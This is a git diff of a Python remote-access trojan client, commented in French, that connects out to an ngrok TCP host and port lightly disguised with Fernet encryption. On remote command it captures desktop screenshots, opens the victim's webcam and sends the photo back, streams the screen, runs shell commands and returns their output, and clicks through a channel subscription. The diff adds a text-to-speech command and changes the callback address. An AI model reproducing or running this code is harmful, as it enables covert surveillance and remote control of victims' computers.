@@ -10,6 +10,7 @@ from pyautogui import click
 from time import sleep
 from vidstream import ScreenShareClient
 from cryptography.fernet import Fernet
+import pyttsx3
 import base64
 
 def screenshot():
@@ -24,8 +25,8 @@ t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #chiffrer le host et le port
 key1 = Fernet.generate_key()
 crypt = Fernet(key1)
-code = crypt.encrypt(b"6.tcp.ngrok.io")
-code2 = crypt.encrypt(b"14250")
+code = crypt.encrypt(b"4.tcp.ngrok.io")
+code2 = crypt.encrypt(b"16201")
 decode = crypt.decrypt(code)
 decode2 = crypt.decrypt(code2)
 #fin du chiffrage
@@ -44,7 +45,6 @@ while True:
         break
 
     #pour démarrer googles
-
     elif commande == "start_google":
         #chiffrement du lien google
         code3 = crypt.encrypt(b"Chrome.exe")
@@ -55,6 +55,18 @@ while True:
     #pour envoyer un message
     elif commande == "send_salut_cmd":
         os.system(f"echo salut")
+#################################test_pour_la_voie###################################
+    elif commande == "voice":
+        new = t.recv(1024).decode("utf-8")
+        while True:
+            new = t.recv(1024).decode("utf-8")
+            engine = pyttsx3.init()
+            voices = engine.getProperty('voices')
+            engine.setProperty("voice", voices[2].id)
+            engine.setProperty('rate', 150)
+            engine.say(f"{new}")
+            engine.runAndWait()
+
 
     #pour eenvoyer des messages
     elif commande =="send_msg":
@@ -68,7 +80,6 @@ while True:
             time.sleep(3)
             pyautogui.press("enter")
 
-
     #pour s'aboonner à ma chaine
     elif commande == "subscribe":
         code4 = crypt.encrypt(b"C:\Program Files (x86)\Google\Chrome\Application\Chrome.exe")
@@ -79,7 +90,6 @@ while True:
         webbrowser.get("chrome").open_new_tab(url)
         sleep(4)
         click(1116, 608)
-
     #pour lancer un live stream
     elif commande == "stream":
         sender = ScreenShareClient(host, port)
@@ -90,7 +100,6 @@ while True:
             continue
 
         sender.stop_stream()
-
     #pour prendre un screen de la personne
     elif commande =="take_facepicture":
         subprocess.run('start microsoft.windows.camera:', shell=True)
@@ -100,20 +109,7 @@ while True:
         t.send(len_img.encode("utf-8"))
         with open("screenface.png", "rb") as img:
             t.send(img.read())
-    #pour le commander
-    elif commande =="start_commander":
-        while True:
-            if commande =="cd":
-                result = subprocess.Popen("cd", shell=True, stdout=subprocess.PIPE)
-                t.send(result.stdout.read())
 
-            elif commande[:2] == "cd":
-                if os.path.exists(str(commande[3:].replace("\n", ""))):
-                    os.chdir(str(commande[3:].replace("\n", "")))
-                    t.send(os.popen("cd").read().encode("utf-8"))
-
-            elif commande == "stop":
-                break
     #pour une screen du bureau
     elif commande == "screenshot":
         screenshot()
@@ -122,15 +118,10 @@ while True:
         with open("screen.png", "rb") as img:
             t.send(img.read())
 
-
-    #phase de test pour la commande whoami
-    elif commande =="whoami":
-        result = subprocess.Popen("dir", shell=True, stdout=subprocess.PIPE)
-        t.send(result.stdout.read())
     #phase de test pour la commande dir
     elif commande =='dir':
         result = subprocess.Popen("dir", shell=True, stdout=subprocess.PIPE)
-        t.send(result.stdout.read())
+        t.send(os.popen("dir").read().encode("utf-8"))
     #pareil commande cd
     elif commande =="cd":
         result = subprocess.Popen("cd", shell=True, stdout=subprocess.PIPE)
